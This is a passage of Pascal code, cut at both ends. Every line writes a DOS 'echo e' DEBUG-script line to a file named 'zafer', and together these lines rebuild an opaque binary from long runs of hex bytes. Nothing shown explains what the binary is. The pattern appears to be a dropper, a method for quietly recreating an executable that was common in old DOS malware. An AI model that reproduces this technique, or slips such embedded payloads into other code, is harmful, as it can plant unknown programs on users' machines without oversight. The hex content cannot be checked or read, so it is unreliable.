   writeln(qup,'echo e 0160  17 29 33 83 78 B2 40 00 4E 34 00 B2 42 00 00 79>>zafer');
   writeln(qup,'echo e 0170  F2 62 6C 53 20 7F 00 00 22 01 50 E4 00 5A 00 EC>>zafer');
   writeln(qup,'echo e 0180  50 07 19 60 36 03 7F 02 84 12 B8 FF FF FF 50 9A>>zafer');
   writeln(qup,'echo e 0190  0A 00 37 00 B8 F9 01 00 50 B8 04 B6 02 00 10 CF>>zafer');
   writeln(qup,'echo e 01A0  76 60 76 08 83 04 69 B6 0E BE 41 EC EB E3 00 00>>zafer');
   writeln(qup,'echo e 01B0  23 FE 8B 0E 9E 07 E3 11 BB DF 4C FF 1E 9C 07 B7>>zafer');
   writeln(qup,'echo e 01C0  BB 4F B8 32 BF 13 09 CB 59 FF 5A 8B DC 2B D8 72>>zafer');
   writeln(qup,'echo e 01D0  0B 3B FF 1E 94 03 72 05 8B E3 52 DB 51 CB 02 A1>>zafer');
   writeln(qup,'echo e 01E0  FF 96 03 40 75 05 33 C0 E9 F6 A8 02 FF 2E 0B FF>>zafer');
   writeln(qup,'echo e 01F0  55 8B EC 56 57 1E B8 FF 7C 03 8E D8 1E 07 8B 56>>zafer');
   writeln(qup,'echo e 0200  FF 06 BE 10 00 AD 3B C2 74 FD 10 40 96 74 0C 97>>zafer');
   writeln(qup,'echo e 0210  B6 25 B9 AA FF F2 AE 8B F7 EB EB 96 FF 99 0B C0>>zafer');
   writeln(qup,'echo e 0220  74 02 8C DA 1F FD 5F 5E 8B E5 5D CA B6 B0 00 1C>>zafer');
   writeln(qup,'echo e 0230  DD CB 3C 16 F6 1F EA D0 22 9D DD 00 C2 E9 FF 56>>zafer');
   writeln(qup,'echo e 0240  02 B4 30 CD 21 3C 02 BB 73 5E 06 50 FF CB 86 E0>>zafer');
   writeln(qup,'echo e 0250  3D 0A 02 B0 04 FE 72 1E BF C4 03 8B 36 DF 1F 2B>>zafer');
   writeln(qup,'echo e 0260  F7 81 FE F6 00 10 72 03 D1 FF 10 FA 8E D7 81 C4>>zafer');
   writeln(qup,'echo e 0270  AE F6 07 FB 73 0E 29 FF 36 C7 06 A2 03 AC 02 F6>>zafer');
   writeln(qup,'echo e 0280  EA F0 02 07 C9 FF C6 B1 04 D3 E0 48 36 FF A3 9E>>zafer');
   writeln(qup,'echo e 0290  03 83 E4 FE 36 89 FD 26 A0 03 03 F7 89 DF 3B 8C>>zafer');
   writeln(qup,'echo e 02A0  C3 2B DE F7 ED DB B4 4A 5E FF 36 8C 1E F8 03 A1>>zafer');
   writeln(qup,'echo e 02B0  2C 00 6E 23 26 04 ED 0B 24 04 DF 3F 22 04 81 00>>zafer');
   writeln(qup,'echo e 02C0  16 FD 07 FC BF B0 07 B9 BB 02 2B CF 53 76 F3 AA>>zafer');
   writeln(qup,'echo e 02D0  97 85 15 95 8A B7 E3 D1 5E FD 35 02 9A 49 29 BF>>zafer');
   writeln(qup,'echo e 02E0  A5 33 ED 9A 5E 01 6B 65 1B 7F 80 0E 5B 04 01 9A>>zafer');
   writeln(qup,'echo e 02F0  DB 94 28 12 C3 EC B8 03 00 81 64 35 DA AA FF C3>>zafer');
   writeln(qup,'echo e 0300  A3 FA 03 B8 DB 00 35 07 89 FE 1E E6 03 8C 06 E8>>zafer');
   writeln(qup,'echo e 0310  03 11 61 ED 2E 8E 06 79 B5 26 C9 BE 7B C5 06 A0>>zafer');
   writeln(qup,'echo e 0320  07 17 0A 33 DB 87 36 66 6B ED 4F 76 E9 FF AC B6>>zafer');
   writeln(qup,'echo e 0330  14 A4 6B BB 4E 9E 15 DF 13 F6 06 52 02 F7 03 74>>zafer');
   writeln(qup,'echo e 0340  06 C6 06 6C 00 CB 3A E5 0E FF E3 3E 8E C1 33 FF>>zafer');
   writeln(qup,'echo e 0350  26 80 FF 3D 00 74 34 B9 0D 00 BE FC D8 03 F3 A6>>zafer');
   writeln(qup,'echo e 0360  74 0B 2D 66 7F A1 B4 68 7E 75 21 EB E5 06 15 86>>zafer');
   writeln(qup,'echo e 0370  BE BA F7 BF 01 04 17 09 AC 2C FD 41 72 0D D2 E0>>zafer');
   writeln(qup,'echo e 0380  92 FF 07 05 0A C2 AA EB B4 EE 55 37 DE 36 80 A7>>zafer');
   writeln(qup,'echo e 0390  6D 1D BF B2 9F 44 85 DB ED F6 C2 80 63 6C 11 8F>>zafer');
   writeln(qup,'echo e 03A0  BF 40 4B 79 E5 BE ED A8 07 BF 02 EF E8 AF 00 08>>zafer');
   writeln(qup,'echo e 03B0  96 AC A6 D7 79 7F F8 02 E9 30 FF 6F AB 33 C9 EB>>zafer');
   writeln(qup,'echo e 03C0  14 74 06 B9 6E 28 EB 0C 17 F4 B9 00 EE 01 EB 05>>zafer');
   writeln(qup,'echo e 03D0  06 FF 01 01 51 0A C9 75 1E BE B6 B0 3A B0 59 74>>zafer');
   writeln(qup,'echo e 03E0  64 AC 7F 6B 00 81 3E 8C 07 FF D6 D6 75 04 FF 16>>zafer');
   writeln(qup,'echo e 03F0  92 07 7B 14 1D B6 56 00 26 0F 4D 00 9A C2 86 00>>zafer');
   writeln(qup,'echo e 0400  2D 8E 13 FF 11 58 0A E4 50 75 0B 83 E3 7E 06 00>>zafer');
   writeln(qup,'echo e 0410  56 7D C7 46 06 FF B9 19 B9 02 5D 15 75 DB 0D 8B>>zafer');
   writeln(qup,'echo e 0420  0E 50 0B 0C 3C F6 04 58 B4 4C AB 8D 38 8C CB A8>>zafer');
   writeln(qup,'echo e 0430  79 07 BB 02 1F 1E C5 16 E6 0D 65 25 2F 1F CB 3B>>zafer');
   writeln(qup,'echo e 0440  8D F7 09 FF 83 EF 04 8B 05 0B 45 02 F6 74 F2 FF>>zafer');
   writeln(qup,'echo e 0450  1D E9 C6 C3 DF 03 93 C7 B7 9A 66 76 95 23 37 0F>>zafer');
   writeln(qup,'echo e 0460  0B 54 77 9A 4C 7C 5A 07 23 EF CD 8B 5E 06 43 C6>>zafer');
   writeln(qup,'echo e 0470  75 17 7E 85 A5 FB B9 0C 74 31 B8 CD 7B 80 3E C1>>zafer');
   writeln(qup,'echo e 0480  8A AD 27 59 FF 07 EB 22 4B 83 FB 02 77 FF 42 8A>>zafer');
   writeln(qup,'echo e 0490  C3 B4 07 3C 01 72 FE 14 B4 04 77 10 E8 93 DD 25>>zafer');
   writeln(qup,'echo e 04A0  2D B4 82 24 35 AF BF C9 3F 1C 72 21 F6 FF C4 01>>zafer');
   writeln(qup,'echo e 04B0  74 05 50 E8 A4 1B B5 58 09 BE 7F 03 E8 4E 02 DD>>zafer');
   writeln(qup,'echo e 04C0  07 04 74 B6 51 E0 0A E3 C5 0C EC FF E9 F8 21 00>>zafer');
   writeln(qup,'echo e 04D0  E8 16 6E 02 1B 10 17 0C 0F 02 6F 30 5E 07 5D FF>>zafer');
   writeln(qup,'echo e 04E0  58 5A 59 D1 E1 03 E1 52 1B E7 5B 77 85 06 56 8B>>zafer');
   writeln(qup,'echo e 04F0  FF 4E 06 8B C1 D1 E0 8D 76 FF 06 03 F0 FF E3 E9>>zafer');
   writeln(qup,'echo e 0500  C7 21 FB E8 E6 FF E8 5F 63 74 03 A0 AD 16 5A BE>>zafer');
   writeln(qup,'echo e 0510  56 08 57 60 BD 38 92 E8 49 BE D1 E8 45 00 91 DF>>zafer');
   writeln(qup,'echo e 0520  08 9F 12 72 D6 4B A4 0A FF F6 74 1F 0A D2 74 CC>>zafer');
   writeln(qup,'echo e 0530  8A FE C2 3A 06 5B 02 76 0D D1 9B AD 02 2E B7 BD>>zafer');
   writeln(qup,'echo e 0540  0C 58 02 DB 75 B7 05 5A 6F 6F B1 FE CD FE 75 08>>zafer');
   writeln(qup,'echo e 0550  E3 AB 3A 0E 62 DF CD A5 E8 96 0F FE 8A F1 E8 2D>>zafer');
   writeln(qup,'echo e 0560  0C EA 82 BB 30 52 B6 F6 01 E8 C4 0D C8 FC FE CE>>zafer');
   writeln(qup,'echo e 0570  8A E6 5A 2B 0F 0D 77 3A 16 35 76 04 8A 16 48 DD>>zafer');
   writeln(qup,'echo e 0580  38 03 74 F6 01 42 C3 A2 34 FD A2 59 02 88 0E B7>>zafer');
   writeln(qup,'echo e 0590  17 C6 4B 05 EC DA FE C9 0B DF 19 59 C3 3C 61 FF>>zafer');
   writeln(qup,'echo e 05A0  72 06 3C 7A 77 02 24 DF 0E 47 3E 1C 05 1E 4E CC>>zafer');
   writeln(qup,'echo e 05B0  17 B4 08 33 85 D2 55 8D 0A FB FF 30 01 83 EB 02>>zafer');
   writeln(qup,'echo e 05C0  E3 05 E8 E1 29 20 EB 08 70 2F 24 DE EC 09 8B 47>>zafer');
   writeln(qup,'echo e 05D0  06 9D A1 D4 20 C8 AD 34 1F 0A 8B 16 1D 06 10 85>>zafer');
   writeln(qup,'echo e 05E0  5D 2B E8 DB 7B 24 0F 02 25 B2 2D 58 15 3F BB 7E>>zafer');
   writeln(qup,'echo e 05F0  04 83 C3 FF 06 81 FB 58 06 73 0A 83 B7 3F E3 F2>>zafer');
   writeln(qup,'echo e 0600  93 78 18 DD F9 EB F8 C1 1C D4 5B BD 37 1C 51 16>>zafer');
   writeln(qup,'echo e 0610  28 B8 DB 1F 2D 55 6D 3D 2C F0 74 1E 50 50 B6 0D>>zafer');
   writeln(qup,'echo e 0620  61 0B 85 9D 6F 43 E8 05 1A BF 5B 63 17 24 BB 58>>zafer');
   writeln(qup,'echo e 0630  1D 3B 46 FA 04 73 E2 5D C2 EE 87 8B 07 99 DD 23>>zafer');
   writeln(qup,'echo e 0640  67 06 B7 EB 0A 06 F8 14 75 40 8B 54 67 BF 9A 92>>zafer');
   writeln(qup,'echo e 0650  B1 20 23 C0 FF 7D 08 B1 2D F7 DA 13 C3 FF F7 D8>>zafer');
   writeln(qup,'echo e 0660  56 51 BE B7 06 88 F0 1C 56 B9 0A AD 32 4A F6 F7>>zafer');
   writeln(qup,'echo e 0670  F1 5B 93 03 FC 92 04 30 4E 88 6F 73 C3 0B DA FD>>zafer');
   writeln(qup,'echo e 0680  75 EB 58 2B C6 59 BF 0C 0C 8B DE 40 5E F4 C3 E9>>zafer');
   writeln(qup,'echo e 0690  9C 19 DF 84 8B FE 98 03 F9 FF 3B C1 73 21 91 2B>>zafer');
   writeln(qup,'echo e 06A0  C1 03 FF D0 2B F8 B0 30 86 05 3C FF 35 72 12 E3>>zafer');
   writeln(qup,'echo e 06B0  0C 4F 8A 05 F0 FE C0 3C 3A BF 3D 42 E2 F4 41 B0>>zafer');
   writeln(qup,'echo e 06C0  DB 31 AA 0F E1 6F 1C FD F3 AE FF FC 41 2A E1 02>>zafer');
   writeln(qup,'echo e 06D0  D4 80 D6 F8 00 BF 95 06 07 79 8B 8A B0 89 16 BF>>zafer');
   writeln(qup,'echo e 06E0  FE C3 50 53 51 52 AD 56 0F FE 2C 01 40 74 15 FF>>zafer');
   writeln(qup,'echo e 06F0  36 DF 10 E8 E2 FF A0 6D 61 0A B8 EA 0D E8 17 0B>>zafer');
   writeln(qup,'echo e 0700  5A E8 E3 61 0A 5E 4C 7F 5B 58 C3 E8 84 0A ED E8>>zafer');
   writeln(qup,'echo e 0710  6D 00 F1 F0 FC 30 74 07 28 3C E7 2A 04 76 48 00>>zafer');
   writeln(qup,'echo e 0720  56 94 C2 8B EF 85 81 FF 87 F3 87 D9 8A 0E B8 06>>zafer');
   writeln(qup,'echo e 0730  C7 0A DB A1 7F AD 0F 0B DB 7F 04 32 0B 39 08 E1>>zafer');
   writeln(qup,'echo e 0740  26 AC 3C FF BF B0 1B E8 1E 00 4B 0B DA 75 ED E8>>zafer');
   writeln(qup,'echo e 0750  02 1E 22 76 20 8C 0F DF 1C E8 0B 00 5E 8E 58 7A>>zafer');
   writeln(qup,'echo e 0760  1C 3D B6 3B 98 D7 84 70 37 28 20 51 1B D7 D4 FB>>zafer');
   writeln(qup,'echo e 0770  0F E8 AC 1C 07 72 FF 53 E8 DF 0F 8B 0F B8 88 56>>zafer');
   writeln(qup,'echo e 0780  28 20 37 BD 8A 47 B6 02 26 48 35 C4 A3 01 C3 5B>>zafer');
   writeln(qup,'echo e 0790  38 0F BF 00 89 04 FE 77 1C E8 27 00 6F 2D C3 51>>zafer');
   writeln(qup,'echo e 07A0  32 C6 E4 B1 AC FB F1 05 30 30 98 46 3F F0 83 C6>>zafer');
   writeln(qup,'echo e 07B0  04 DD 06 39 7E 0D BB FC FE C4 29 72 31 75 20 50>>zafer');
   writeln(qup,'echo e 07C0  E2 6E F5 76 0A ED 4B B8 31 B6 16 06 0F DB C3 CF>>zafer');
   writeln(qup,'echo e 07D0  B0 68 E5 56 A6 6A 8D 2F CB 84 06 E9 D7 46 1C 19>>zafer');
   writeln(qup,'echo e 07E0  25 78 4B 88 38 D9 FC 06 12 F5 93 0B D2 B6 39 EB>>zafer');
   writeln(qup,'echo e 07F0  24 FC 2C 1C 8E C2 26 0B B3 43 74 A6 F3 2E 3F E8>>zafer');
   writeln(qup,'echo e 0800  F9 36 7A 4C DD 15 E3 48 9F 24 51 E8 E9 1B B3 8B>>zafer');
   writeln(qup,'echo e 0810  87 F3 44 F1 06 75 2B A0 BD D3 2A 06 57 A1 AC 4F>>zafer');
   writeln(qup,'echo e 0820  63 20 8A A0 D9 D8 E4 76 5F C7 C8 8B D3 52 86 8B>>zafer');
   writeln(qup,'echo e 0830  6D C2 B7 20 2C FF 18 5B 03 CB E3 0F 06 0D 00 07>>zafer');
   writeln(qup,'echo e 0840  0A 1F DF 06 D2 1B 07 E2 C3 C5 C3 8A FA E8 8A 1C>>zafer');
   writeln(qup,'echo e 0850  76 6E 2C E9 0A 09 D6 4B 6D E1 EB B0 A2 52 12 85>>zafer');
   writeln(qup,'echo e 0860  A8 6E 6C F6 FF C7 1D 55 FE E0 E9 9F 17 FD CB EB>>zafer');
   writeln(qup,'echo e 0870  34 BF 04 02 EB 2F B8 14 E5 00 EB 2A E5 01 EB 25>>zafer');
   writeln(qup,'echo e 0880  6F 0E 20 B8 03 2F 08 B8 03 2D 03 B1 04 02 3C 39>>zafer');
   writeln(qup,'echo e 0890  A3 68 70 E5 E9 B6 13 33 12 DB 11 30 01 60 12 CF>>zafer');
   writeln(qup,'echo e 08A0  8D 35 FF 01 A0 68 06 98 48 7F 32 6C B2 32 0B 9C>>zafer');
   writeln(qup,'echo e 08B0  75 89 23 74 6D 2F 14 8D 37 13 86 C4 44 97 0E 2A>>zafer');
   writeln(qup,'echo e 08C0  CC 85 91 6A ED 05 0E 00 13 EB 45 01 59 9A 76 E8>>zafer');
   writeln(qup,'echo e 08D0  53 41 F6 0F B0 2C 0D DB 3D 07 07 6E 05 3B 01 06>>zafer');
   writeln(qup,'echo e 08E0  BA B7 A0 49 5E 5D FD A8 03 75 07 A8 08 6F 8B CA>>zafer');
   writeln(qup,'echo e 08F0  08 00 4D 2A CA AD 04 83 DB 0E FD BA 03 F8 D8 40>>zafer');
   writeln(qup,'echo e 0900  C6 07 20 EF 2C EB 30 E8 FE B7 FC 0F 80 3F 85 20>>zafer');
   writeln(qup,'echo e 0910  53 F6 46 48 E8 5C 10 C2 25 D2 83 3C 7B 91 B0 22>>zafer');
   writeln(qup,'echo e 0920  4A F2 5B 53 EC 3F 01 0B DA A0 D9 18 A6 5F 12 45>>zafer');
   writeln(qup,'echo e 0930  60 18 FD 5B E9 22 03 92 B8 08 39 01 5E BD FF 74>>zafer');
   writeln(qup,'echo e 0940  21 DE 99 EB 04 92 19 58 E1 A5 E5 56 6F FF 2A C4>>zafer');
   writeln(qup,'echo e 0950  72 04 3A C2 73 85 09 AE 1A 03 FF 91 F9 C3 BB 72>>zafer');
   writeln(qup,'echo e 0960  C6 02 C7 21 F8 66 04 C7 07 5C 43 4E 4E 4A 96 DE>>zafer');
   writeln(qup,'echo e 0970  05 89 04 C3 F4 DE BE 7B 09 B8 6C 06 97 C0 99 1F>>zafer');
   writeln(qup,'echo e 0980  28 94 1F 2D AE 0B 6C D1 1D 26 B6 0D F7 CB 6C 04>>zafer');
   writeln(qup,'echo e 0990  34 06 EF CB 3C 0A E9 26 F6 44 A3 47 9B 6D 3C 16>>zafer');
   writeln(qup,'echo e 09A0  1C 0B 31 37 B4 05 05 2E 24 FD 04 FD 40 0D C6 CD>>zafer');
   writeln(qup,'echo e 09B0  04 21 F0 08 56 BE 4E 2C 91 39 6C B5 C3 08 52 ED>>zafer');
   writeln(qup,'echo e 09C0  A0 47 88 FF C0 78 22 75 1B 57 8B 3E FC BA 06 4F>>zafer');
   writeln(qup,'echo e 09D0  4F 8B F4 6E 73 0A B9 16 83 FD 97 3B F3 A5 6F F5>>zafer');
   writeln(qup,'echo e 09E0  EF 83 C5 C6 02 5F 46 D7 00 9C 60 79 FF 51 91 76>>zafer');
   writeln(qup,'echo e 09F0  96 CB 57 9A B8 BF D8 BE B9 56 2C 20 F0 07 5F C3>>zafer');
   writeln(qup,'echo e 0A00  6F DD 0B C9 7E ED 15 51 16 13 FE 7A 02 57 41 D1>>zafer');
   writeln(qup,'echo e 0A10  E9 B8 85 A1 F6 F3 AB 5E 59 CD F6 43 01 5F 63 B5>>zafer');
   writeln(qup,'echo e 0A20  73 B6 5F FF 83 FF 48 01 FE 1B 50 A1 65 1B 25 64>>zafer');
   writeln(qup,'echo e 0A30  D9 02 58 B4 BC 7D 5A 21 D7 90 F6 6F 8C 03 AA 91>>zafer');
   writeln(qup,'echo e 0A40  1E DB 0D 05 60 00 42 2F 60 51 12 B6 D6 92 4A FF>>zafer');
   writeln(qup,'echo e 0A50  73 01 AA 59 F3 A4 E8 D0 DC 01 CB 15 C9 6C 08 1C>>zafer');
   writeln(qup,'echo e 0A60  38 0C 15 DB B7 15 91 1F D2 E4 77 C6 E1 20 C2 0C>>zafer');
   writeln(qup,'echo e 0A70  79 89 F8 46 28 E0 F3 91 EF 23 E3 13 C4 7E FE 08>>zafer');
   writeln(qup,'echo e 0A80  1F 2B C8 73 04 03 2D 07 B6 C9 92 BA 54 AD 58 22>>zafer');
   writeln(qup,'echo e 0A90  83 08 19 69 09 23 7E 8B FB EB E4 00 3A 50 36 B4>>zafer');
   writeln(qup,'echo e 0AA0  D3 0D 6C 1A 1A D0 DF 08 5F 02 36 8E E1 07 93 92>>zafer');
   writeln(qup,'echo e 0AB0  43 6D 1F 02 F1 0F F6 C5 80 A0 0D 55 41 AD 50 39>>zafer');
   writeln(qup,'echo e 0AC0  F6 C3 80 E5 7F 11 C3 57 5C 3C 21 23 65 1F DD 03>>zafer');
   writeln(qup,'echo e 0AD0  DA 49 06 63 3B DE 60 38 B3 37 75 2B C3 B3 4A 77>>zafer');
   writeln(qup,'echo e 0AE0  5B 1C 06 37 0A 8E 16 87 01 DE 48 03 46 46 DA 2E>>zafer');
   writeln(qup,'echo e 0AF0  5C 5B 37 74 3F A5 1E 68 15 B5 89 77 0E 83 FF 5B>>zafer');
   writeln(qup,'echo e 0B00  FF B8 CA 01 E3 1F 36 A1 50 DB 01 3D 08 74 E1 54>>zafer');
   writeln(qup,'echo e 0B10  36 83 D8 52 72 DB 93 37 16 0B 22 89 6A 6F DE 45>>zafer');
   writeln(qup,'echo e 0B20  9A 11 0A 86 36 BA 53 A3 36 06 69 DD 8B DA 66 8B>>zafer');
   writeln(qup,'echo e 0B30  B7 D8 64 3F 26 C6 3B 0D 44 D1 50 B8 60 83 C1 36>>zafer');
   writeln(qup,'echo e 0B40  B0 67 25 16 FD 51 9A 06 01 D8 02 CB 8A 65 6E 5B>>zafer');
   writeln(qup,'echo e 0B50  22 BB 5B 21 AB 91 5B 05 58 DB 83 C7 BE E9 DB C1>>zafer');
   writeln(qup,'echo e 0B60  1A 3B 1E 68 56 35 09 D2 61 F2 70 36 C8 82 5D F0>>zafer');
   writeln(qup,'echo e 0B70  47 04 EE 54 5B B0 53 49 67 1D 9B 03 EB B4 61 6A>>zafer');
   writeln(qup,'echo e 0B80  3B 75 DE 48 1C 75 1A 6F 1B FB E8 CE FC FE E3 22>>zafer');
   writeln(qup,'echo e 0B90  F6 C1 01 5A 06 DD 31 03 FF 2E 08 FF 35 C9 7C 0B>>zafer');
   writeln(qup,'echo e 0BA0  07 DF FD E8 B0 FE 03 D9 26 2E 2E 00 97 34 10 5D>>zafer');
   writeln(qup,'echo e 0BB0  90 3D 8B 52 09 6E 05 D9 C3 72 09 2B 69 E8 0D F7>>zafer');
   writeln(qup,'echo e 0BC0  5B 12 CB 85 05 F4 DC 36 3B 84 25 2E 68 D7 3B 5B>>zafer');
   writeln(qup,'echo e 0BD0  93 3C 0B 07 13 B6 00 96 2E 60 B0 9C 8D 6B C4 1C>>zafer');
   writeln(qup,'echo e 0BE0  3D EA C3 B4 12 7F B8 83 74 14 19 CD B0 12 FF DF>>zafer');
   writeln(qup,'echo e 0BF0  4E FF 37 9A 38 02 6E 67 07 5A 07 1C A1 57 C4 65>>zafer');
   writeln(qup,'echo e 0C00  FF 6A 8D 9B 2F C1 F7 E0 D0 48 5F 58 21 57 59 4E>>zafer');
   writeln(qup,'echo e 0C10  17 6D 1E B5 85 1F E7 1B 8F 13 8D C9 14 B5 1F 82>>zafer');
   writeln(qup,'echo e 0C20  B6 3C 91 FB 0C 52 B0 0D 6F D0 06 39 4F B7 04 90>>zafer');
   writeln(qup,'echo e 0C30  E8 98 EE FF EB E8 45 83 93 B9 69 3B 77 6E 0E 21>>zafer');
   writeln(qup,'echo e 0C40  F5 5D 06 3B C3 37 B4 5F FE EB 81 F7 EA 46 C9 F8>>zafer');
   writeln(qup,'echo e 0C50  3B DC 76 6B D6 41 17 2D 04 C6 0E 5F 47 DB 0A 8C>>zafer');
   writeln(qup,'echo e 0C60  3E 89 7A 19 A0 02 DF 15 3B DE 77 4F 6D 79 99 D6>>zafer');
   writeln(qup,'echo e 0C70  06 1B A9 F6 1E 5B 06 A1 FA 8B 4F F4 E3 51 EB BE>>zafer');
   writeln(qup,'echo e 0C80  25 8A 4F F7 E3 16 A2 D1 F1 45 68 A9 66 0E 1F 83>>zafer');
   writeln(qup,'echo e 0C90  7E 6D 63 CB 89 36 54 3C 08 92 2B 74 0D 41 BA 4B>>zafer');
   writeln(qup,'echo e 0CA0  12 9A 35 CE B6 C5 59 52 8B D0 7C 81 C1 64 04 0B>>zafer');
   writeln(qup,'echo e 0CB0  6A 70 DB F8 5E BC 36 4B 0C 65 32 50 F4 A2 92 D6>>zafer');
   writeln(qup,'echo e 0CC0  0A 26 D0 53 B4 50 80 2F 18 00 5B B9 02 12 C2 BA>>zafer');
   writeln(qup,'echo e 0CD0  04 DA BF BC DB 15 3E C5 78 E8 22 00 99 D4 A0 1A>>zafer');
   writeln(qup,'echo e 0CE0  5B CE 33 08 E3 B9 FA 40 B0 8F BF 28 FC 1B 78 BB>>zafer');
   writeln(qup,'echo e 0CF0  78 BF 04 31 1C 00 7D F2 52 BB 02 9A 19 63 A1 1E>>zafer');
   writeln(qup,'echo e 0D00  2A F6 AB 93 01 FE 40 40 03 FA E2 F6 D1 19 33 D0>>zafer');
   writeln(qup,'echo e 0D10  30 60 50 66 A0 9C FF 58 75 0C D1 E8 3D 80 FA 00>>zafer');
   writeln(qup,'echo e 0D20  73 F0 EA FE BA 51 9A D6 7A 2F D2 C3 52 1F E9 FC>>zafer');
   writeln(qup,'echo e 0D30  E3 F1 20 8C C0 3B DF E7 75 18 FF 76 08 6D 8D 51>>zafer');
   writeln(qup,'echo e 0D40  6C 6C 06 A9 77 19 04 04 34 7C 7E 2F 4D 05 74 7B>>zafer');
   writeln(qup,'echo e 0D50  B7 8B 20 8B 54 E8 02 3B 55 5E 08 32 8B 04 1F 6B>>zafer');
   writeln(qup,'echo e 0D60  3B 47 81 FA 80 76 3B 16 C4 E3 75 1D 44 42 8D 85>>zafer');
   writeln(qup,'echo e 0D70  40 C6 3D 93 61 FB 87 05 89 07 97 42 C0 21 EA 3E>>zafer');
   writeln(qup,'echo e 0D80  EB 2C 3B D8 3C 28 97 6D E8 7F FE FC 50 8B C7 E3>>zafer');
   writeln(qup,'echo e 0D90  25 8B D8 40 8B 5D 98 88 FD A3 11 36 B8 E8 BE FC>>zafer');
   writeln(qup,'echo e 0DA0  43 C4 1B C5 E8 EC CD FD 91 7A 1C 50 93 70 08 C1>>zafer');
   writeln(qup,'echo e 0DB0  07 A9 59 BD 41 D8 E9 EB 80 EE 73 2E 00 89 DD 3D>>zafer');
   writeln(qup,'echo e 0DC0  74 10 A3 92 BE 78 9A AC 00 C7 8A 19 89 DD 05 C3>>zafer');
   writeln(qup,'echo e 0DD0  19 1C B4 FE 14 4B 67 F6 B4 FE 02 4D 65 47 B7 F4>>zafer');
   writeln(qup,'echo e 0DE0  14 EB E9 ED E9 AF 17 92 70 9D 5E E3 77 14 BA 14>>zafer');
   writeln(qup,'echo e 0DF0  36 32 C3 5D D0 72 0A D4 06 90 2F 27 03 BA 7E 73>>zafer');
   writeln(qup,'echo e 0E00  10 1C 86 EB EE 8C 17 87 D0 EB 87 D8 9F EB 82 41>>zafer');
   writeln(qup,'echo e 0E10  16 F1 D2 FB E3 F0 AD 15 AD AE F9 41 FD E8 C8 FB>>zafer');
   writeln(qup,'echo e 0E20  5A E3 DD 2F 35 03 CF 78 C3 54 8B 9A 29 4F 5B 50>>zafer');
   writeln(qup,'echo e 0E30  FA 02 98 FF 3B C7 74 0C E8 90 FC DF EB 43 0F C7>>zafer');
   writeln(qup,'echo e 0E40  D1 75 0F B8 7A 43 FC 97 1D FB 2B 8E CB FE E1 E9>>zafer');
   writeln(qup,'echo e 0E50  28 FF 0F 42 B9 89 88 56 3A C0 F9 BF 5D F7 5A 2B>>zafer');
   writeln(qup,'echo e 0E60  F2 2B DB CA FD E0 FC EF 2B FA 47 50 FD CB FB 5B>>zafer');
   writeln(qup,'echo e 0E70  51 8B CA 8C 9A E9 0B 29 E9 DF F4 16 14 B6 A3 FB>>zafer');
   writeln(qup,'echo e 0E80  B1 42 09 1C 96 2E 16 50 FB DE 3C 07 50 96 C5 24>>zafer');
   writeln(qup,'echo e 0E90  BC 89 E9 DA FE 5A D1 36 C9 0E CC 9E 2A 8E 15 E5>>zafer');
   writeln(qup,'echo e 0EA0  5D E7 ED EC E8 68 FB A1 F4 63 FB AE 25 9E A3 B5>>zafer');
   writeln(qup,'echo e 0EB0  5D BB E3 46 3B 10 60 9F D6 73 05 F1 06 9F A9 BD>>zafer');
   writeln(qup,'echo e 0EC0  0D 74 45 50 DA 14 E8 A8 37 1A A9 00 6F 0C 68 FD>>zafer');
   writeln(qup,'echo e 0ED0  8C EE C2 8E DA 91 6F 96 59 03 F1 68 67 DB 9A 10>>zafer');
   writeln(qup,'echo e 0EE0  23 51 B7 2E 0B 43 ED 36 FB 11 B8 4E A3 22 7F 37>>zafer');
   writeln(qup,'echo e 0EF0  9F 58 58 09 7F 7A EB EB C1 94 C2 E8 D3 0A B6 33>>zafer');
   writeln(qup,'echo e 0F00  0E FD 2E 07 FB 86 AC DB C9 E3 F3 FB E8 F5 FA 11>>zafer');
   writeln(qup,'echo e 0F10  0F EB BB 6B 25 61 77 EB E6 AD 00 51 06 BB B4 6A>>zafer');
   writeln(qup,'echo e 0F20  FB 1F AB 0A 40 50 BD 53 88 1D 5F 48 F6 EC 01 16>>zafer');
   writeln(qup,'echo e 0F30  C9 DF 49 69 B5 FA E9 A9 E1 1C 7B 5E FA 8B 5D 7B>>zafer');
   writeln(qup,'echo e 0F40  3B D1 9F 76 5A 51 01 BB 7B 01 9F 92 55 EE D8 3B>>zafer');
   writeln(qup,'echo e 0F50  86 08 8F FF 92 9E E9 E4 FD 00 31 14 D8 C5 0F 01>>zafer');
   writeln(qup,'echo e 0F60  47 55 6E 4F CD 10 E1 BC BE 0C 0E ED 01 49 17 37>>zafer');
   writeln(qup,'echo e 0F70  EF 01 D2 4A C3 8F DA E8 7F B7 5E A0 D2 12 A6 DB>>zafer');
   writeln(qup,'echo e 0F80  04 05 D1 C3 01 52 4F 7B F6 01 D1 E2 01 31 68 31>>zafer');
   writeln(qup,'echo e 0F90  DC C3 F7 E2 2F 10 A3 4E 04 A9 58 CD 7A 04 1F 5A>>zafer');
   writeln(qup,'echo e 0FA0  3B 50 8A 3E 6C 25 B4 1B F8 B1 FE FF 42 86 F2 42>>zafer');
   writeln(qup,'echo e 0FB0  3A E9 2E FF E0 0E D8 01 D9 D1 CE 50 C0 D5 D6 CE>>zafer');
   writeln(qup,'echo e 0FC0  07 E2 3C FF 68 69 97 5D 1F EB 41 0E 14 2F DD 6C>>zafer');
   writeln(qup,'echo e 0FD0  64 D3 4D 63 21 62 6B 05 37 B5 A1 2E 0B 26 A1 B6>>zafer');
   writeln(qup,'echo e 0FE0  D6 04 13 C5 17 1B 38 81 B7 3E 34 07 27 81 75 02>>zafer');
   writeln(qup,'echo e 0FF0  6D B8 05 4A 5E 05 7E 1B C3 03 67 2A B1 B6 4A 62>>zafer');
   writeln(qup,'echo e 1000  4A FC 6F 50 B4 2F 59 40 FF 58 67 15 38 BB 3B 6C>>zafer');
   writeln(qup,'echo e 1010  74 2A D6 91 B4 03 8B B6 41 A2 98 D0 7F 1B F0 C8>>zafer');
   writeln(qup,'echo e 1020  A9 06 B2 6D 18 1E FC EC 01 19 74 11 06 6F E6 8E>>zafer');
   writeln(qup,'echo e 1030  C0 26 1D 16 04 8B 07 8D 42 D9 FD 0D 0A 5A 58 A3>>zafer');
   writeln(qup,'echo e 1040  AB 30 E2 93 22 ED F3 3D 63 F8 74 76 06 8A 1E 5F>>zafer');
   writeln(qup,'echo e 1050  61 80 FB 13 74 AD 6D A9 DB 8E C1 08 40 5A 01 F5>>zafer');
   writeln(qup,'echo e 1060  43 A9 BF 75 7E 19 0E EB 56 26 B7 AB 7C 00 74 04>>zafer');
